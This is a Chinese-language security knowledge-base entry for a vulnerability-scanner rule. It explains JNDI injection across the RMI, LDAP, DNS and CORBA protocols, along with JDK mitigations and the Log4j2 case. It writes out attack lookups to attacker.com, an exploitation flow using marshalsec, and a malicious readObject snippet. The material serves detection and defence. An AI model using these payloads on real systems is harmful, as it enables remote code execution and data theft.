# Java Naming and Directory Interface (JNDI) 注入漏洞完整解析

> 规则 ID：`other_jndi_jndii` · 类别：jndii · 关键 sink：InitialContext, lookup
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


### Java Naming and Directory Interface (JNDI) 注入漏洞完整解析
JNDI 是 Java 提供的一套标准 API，用于统一访问不同的命名和目录服务（如 LDAP、RMI、DNS、CORBA 等），核心作用是将“名称”与“资源/对象”绑定，允许程序通过名称动态查找和加载远程或本地资源。JNDI 注入漏洞本质是攻击者通过控制 JNDI API 的输入参数，迫使应用程序从恶意构造的命名/目录服务中加载并执行恶意对象，最终实现代码执行、数据泄露等攻击效果。

#### 一、漏洞核心原理
JNDI 的核心组件包括 `InitialContext`（初始上下文）、`Context`（上下文对象）、`NamingManager`（命名管理器）等。当应用程序使用用户可控的字符串作为 JNDI 查找（`lookup()`）的参数时，攻击者可构造恶意的 JNDI 地址（如 `ldap://attacker.com:1389/evil`），触发以下关键流程：
1. 应用程序调用 `InitialContext.lookup(恶意JNDI地址)`；
2. JNDI 驱动（如 LDAP/RMI 驱动）向攻击者控制的服务器发起连接；
3. 恶意服务器返回包含恶意类（如 `Exploit.class`）的引用；
4. JVM 加载并实例化该恶意类，执行其中的恶意代码（如 `static` 代码块、构造方法）。

核心风险点：JNDI 支持从远程加载对象，且默认情况下 JVM 对远程类的加载缺乏严格校验，导致攻击者可通过控制 lookup 输入实现远程代码执行（RCE）。

#### 二、JNDI 注入的核心触发场景
JNDI 注入的触发依赖两个前提：
- 应用程序使用用户可控的输入作为 `lookup()` 方法的参数；
- JVM 环境未对远程类加载、JNDI 协议访问做严格限制。

以下是典型的触发代码示例：
```java
// 危险代码：用户输入直接作为JNDI lookup参数
String userInput = request.getParameter("name"); // 攻击者可控
Context ctx = new InitialContext();
Object obj = ctx.lookup(userInput); // 触发JNDI注入
```

#### 三、不同协议下的 JNDI 注入变种
JNDI 支持多种底层协议，不同协议的注入方式、利用条件和效果存在差异，核心变种包括：

##### 1. RMI（Remote Method Invocation）协议注入
RMI 是 Java 原生的远程方法调用协议，JNDI 可通过 RMI 查找远程对象。
- **利用原理**：攻击者搭建恶意 RMI 服务器，绑定一个包含恶意类的 `Reference` 对象；当受害端调用 `lookup("rmi://attacker.com:1099/evil")` 时，RMI 服务器返回 `Reference`，受害端的 `NamingManager` 会根据 `Reference` 中的地址加载恶意类。
- **关键限制**：
  - JDK 6u45、7u21 之前：默认允许加载远程 `Reference` 指向的类，无需额外配置，利用成本极低；
  - JDK 7u21+ / 8u121+：新增 `com.sun.jndi.rmi.object.trustURLCodebase` 系统属性，默认值为 `false`，禁止 RMI 加载远程 `Codebase` 的类，直接利用 RMI 注入失效；
  - 仅当受害端手动将该属性设为 `true` 时，RMI 注入才可利用。
- **利用流程**：
  1. 攻击者编写恶意类（如 `Evil.class`），并部署到 HTTP 服务器（如 `http://attacker.com/`）；
  2. 搭建恶意 RMI 服务器，绑定 `Reference` 对象（指定类名、Codebase、工厂类）；
  3. 诱导受害端调用 `lookup("rmi://attacker.com:1099/evil")`；
  4. 受害端从 RMI 服务器获取 `Reference`，从 HTTP 服务器加载 `Evil.class` 并执行。

##### 2. LDAP（Lightweight Directory Access Protocol）协议注入
LDAP 是轻量级目录访问协议，JNDI-LDAP 驱动对远程类加载的支持更灵活，是 JNDI 注入最主流的利用方式。
- **利用原理**：攻击者搭建恶意 LDAP 服务器（如使用 `marshalsec` 工具），返回包含恶意类引用的 LDAP 响应；受害端调用 `lookup("ldap://attacker.com:1389/evil")` 时，LDAP 服务器返回 `Reference` 或直接序列化的恶意对象，触发代码执行。
- **细分场景**：
  - **场景1：JDK 8u191 之前（无 LDAP 限制）**
    LDAP 驱动允许返回 `Reference` 对象，受害端会根据 `Reference` 中的 `javaCodebase`（远程 HTTP 地址）加载恶意类，无需额外配置，利用成功率极高。
  - **场景2：JDK 8u191+（限制 `Reference` 类加载）**
    Oracle 修复了 LDAP `Reference` 远程类加载，但未完全禁止 LDAP 响应中的序列化对象；攻击者可通过 LDAP 服务器返回恶意序列化对象（如 `javax.naming.ldap.Rdn` 等原生类的恶意实例），利用 JVM 内置类的反序列化漏洞执行代码（需依赖反序列化 gadget）。
  - **场景3：纯内存 LDAP 注入（无外部 HTTP 服务器）**
    部分恶意 LDAP 服务器可直接在 LDAP 响应中嵌入恶意类的字节码，无需依赖外部 HTTP 服务器，受害端加载内存中的字节码执行，规避网络拦截。
- **关键优势**：LDAP 协议默认端口（389/636/1389）更易绕过防火墙，且 LDAP 驱动对 `Codebase` 的限制晚于 RMI，成为 JNDI 注入的主要利用途径。

##### 3. DNS 协议注入
DNS 协议注入是 JNDI 注入的边缘场景，利用性较低：
- **利用原理**：JNDI-DNS 驱动解析域名时，攻击者可通过控制 DNS 服务器返回恶意的 SRV 记录，指向恶意 RMI/LDAP 服务器，间接触发注入；或通过 DNS 解析泄露受害端的内网信息（如解析 `{{local_ip}}.attacker.com`，攻击者从 DNS 日志获取受害端 IP）。
- **限制**：DNS 协议本身不支持返回类引用或序列化对象，无法直接执行代码，主要用于信息泄露，需结合其他漏洞（如反序列化）才能实现 RCE。

##### 4. CORBA 协议注入
CORBA 是分布式对象协议，JNDI-CORBA 驱动的注入利用极少：
- **利用原理**：攻击者搭建恶意 CORBA 服务器，绑定恶意对象；受害端调用 `lookup("corbaname::attacker.com:2809/evil")` 时加载恶意对象。
- **限制**：CORBA 配置复杂，且现代 JDK 对 CORBA 的支持逐渐弱化（JDK 9+ 标记为废弃，JDK 11 移除），实际利用场景极少。

#### 四、影响 JNDI 注入利用的关键因素
JNDI 注入的成功与否，除协议类型外，还受以下核心因素影响：

##### 1. JDK 版本（核心限制）
Oracle 针对 JNDI 注入的修复主要集中在以下版本，直接影响利用方式：
| JDK 版本                | 关键限制                                                                 |
|-------------------------|--------------------------------------------------------------------------|
| JDK 6u45 / 7u21 之前    | RMI/LDAP 无限制，可直接加载远程类                                        |
| JDK 7u21+ / 8u121+      | RMI：`trustURLCodebase=false`，禁止 RMI 远程类加载                       |
| JDK 8u191+              | LDAP：限制 `Reference` 的 `javaCodebase` 远程类加载，需依赖反序列化 gadget |
| JDK 11+                 | 移除 CORBA 支持，LDAP 驱动进一步限制，注入难度大幅提升                    |

##### 2. 系统属性配置
JVM 的以下系统属性可改变 JNDI 注入的利用条件：
- `com.sun.jndi.rmi.object.trustURLCodebase`：控制 RMI 是否允许加载远程 Codebase（7u21+ 默认 false）；
- `com.sun.jndi.ldap.object.trustURLCodebase`：控制 LDAP 是否允许加载远程 Codebase（8u191+ 默认 false）；
- `java.rmi.server.useCodebaseOnly`：限制 RMI 类加载仅使用本地 Codebase（默认 true）；
- `jdk.serialFilter`：JDK 9+ 新增的序列化过滤器，可拦截恶意序列化对象（影响 LDAP 反序列化利用）。

##### 3. 应用层限制
- 若应用对 JNDI lookup 的输入做了白名单校验（如仅允许本地地址、特定协议），可阻断注入；
- 若应用使用自定义的 `InitialContextFactory`，可能限制协议类型或类加载行为；
- 若应用部署了安全管理器（SecurityManager），可禁止远程类加载、网络连接等操作（但现代 JDK 已弱化 SecurityManager）。

#### 五、非典型 JNDI 注入场景
除直接调用 `lookup()` 外，以下间接场景也可能触发 JNDI 注入：

##### 1. 框架/中间件内置的 JNDI 调用
许多 Java 框架（如 Spring、Struts2、Log4j2）或中间件（如 Tomcat、JBoss）会在底层调用 JNDI，若用户输入可渗透到这些内置调用中，会触发注入：
- **Log4j2 漏洞（CVE-2021-44228）**：Log4j2 的 `lookup` 功能支持 `${jndi:xxx}` 语法，攻击者可通过日志输入注入 JNDI 地址，触发远程代码执行（史上最知名的 JNDI 注入漏洞）；
- **Spring Framework JNDI 注入**：Spring 的 `JndiObjectFactoryBean`、`@Value("${jndi:xxx}")` 等功能若使用用户输入，可触发注入；
- **Tomcat JNDI 配置注入**：Tomcat 的 `context.xml` 配置若引用用户可控的 JNDI 地址，可导致注入。

##### 2. 反序列化触发的 JNDI 注入
攻击者通过反序列化漏洞，将包含恶意 JNDI lookup 调用的对象注入到应用中，触发间接注入：
```java
// 恶意序列化对象中的代码
class EvilSerializable implements Serializable {
    private void readObject(ObjectInputStream in) throws Exception {
        InitialContext ctx = new InitialContext();
        ctx.lookup("ldap://attacker.com:1389/evil"); // 反序列化时执行
    }
}
```

##### 3. 动态类加载中的 JNDI 注入
应用通过 JNDI 获取类名/资源路径，再通过 `Class.forName()` 加载类，若类名可控，可触发注入：
```java
String className = ctx.lookup(userInput).toString(); // userInput为恶意JNDI地址
Class<?> clazz = Class.forName(className); // 加载恶意类
```

#### 六、JNDI 注入的危害
- **远程代码执行（RCE）**：核心危害，攻击者可执行任意命令（如挖矿、植入木马、窃取数据）；
- **信息泄露**：通过 JNDI 查找内网资源（如数据库连接池、LDAP 目录信息），泄露敏感配置；
- **内网横向移动**：利用受害端的内网权限，通过 JNDI 注入访问内网其他服务（如 RMI/LDAP 服务器）；
- **权限提升**：执行恶意代码后，提权至系统管理员权限，控制整个服务器。

#### 总结
JNDI 注入的本质是“可控输入 + 远程类加载/反序列化”的组合漏洞，其利用方式随 JDK 版本迭代不断变化（从直接加载远程类到依赖反序列化 gadget），且不同协议（LDAP/RMI/DNS）的利用条件和成功率差异显著。其中 LDAP 协议因限制少、绕过性强，成为最主流的利用途径；而框架/中间件的内置 JNDI 调用（如 Log4j2）则放大了漏洞的影响范围，成为大规模攻击的重灾区。

